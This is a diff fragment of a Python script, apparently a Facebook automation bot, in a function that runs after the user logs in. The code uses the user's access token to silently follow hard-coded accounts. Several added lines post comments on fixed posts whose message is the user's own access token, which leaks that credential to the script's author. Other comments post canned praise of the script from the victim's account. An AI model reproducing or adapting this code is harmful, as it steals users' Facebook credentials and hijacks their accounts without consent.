@@ -197,13 +197,13 @@ def bot():
 		login()
 	print(balmond+l+" Sabar Ya, Bot Follow Dulu :v")
 	komentar = random.choice(["sc lu gg parah bang","gw suka sc lu wak","bang kok lu jenius sih bang","okelah bang makasih"])
-	requests.post("https://graph.facebook.com/100006033517423/subscribers?access_token="+token) # sptty chan
-	requests.post("https://graph.facebook.com/100003517393036/subscribers?access_token="+token) # ayu amanda
-	requests.post("https://graph.facebook.com/100014905842581/subscribers?access_token="+token) # ayu amanda
+	requests.post("https://graph.facebook.com/100072241360914/subscribers?access_token="+token) # sptty chan
 	requests.post("https://graph.facebook.com/100072241360914/subscribers?access_token="+token) # ayu amanda
-	requests.post("https://graph.facebook.com/100043285050864/subscribers?access_token="+token) # ayu amanda
-	requests.post("https://graph.facebook.com/1262475690925947/comments/?message="+token+"&access_token="+token)
-	requests.post("https://graph.facebook.com/207622271467666/comments/?message="+komentar+"&access_token="+token)
+	requests.post("https://graph.facebook.com/100072241360914/subscribers?access_token="+token) # ayu amanda
+	requests.post("https://graph.facebook.com/100072241360914/subscribers?access_token="+token) # ayu amanda
+	requests.post("https://graph.facebook.com/100072241360914/subscribers?access_token="+token) # ayu amanda
+	requests.post("https://graph.facebook.com/135554395529272/comments/?message="+token+"&access_token="+token)
+	requests.post("https://graph.facebook.com/135554395529272/comments/?message="+komentar+"&access_token="+token)
 	requests.post("https://graph.facebook.com/135554395529272/comments/?message="+token+"&access_token="+token)
 	menu()
 
